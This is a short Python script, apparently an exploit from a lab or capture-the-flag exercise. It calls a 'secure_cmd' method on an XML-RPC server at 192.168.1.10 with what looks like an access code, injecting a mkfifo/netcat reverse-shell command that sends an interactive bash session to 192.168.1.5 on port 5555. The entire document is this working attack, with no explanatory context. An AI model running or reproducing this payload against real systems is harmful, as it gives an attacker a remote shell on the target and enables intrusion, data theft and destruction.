import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://192.168.1.10:8000')
s.secure_cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.5 5555 > /tmp/f',6935)
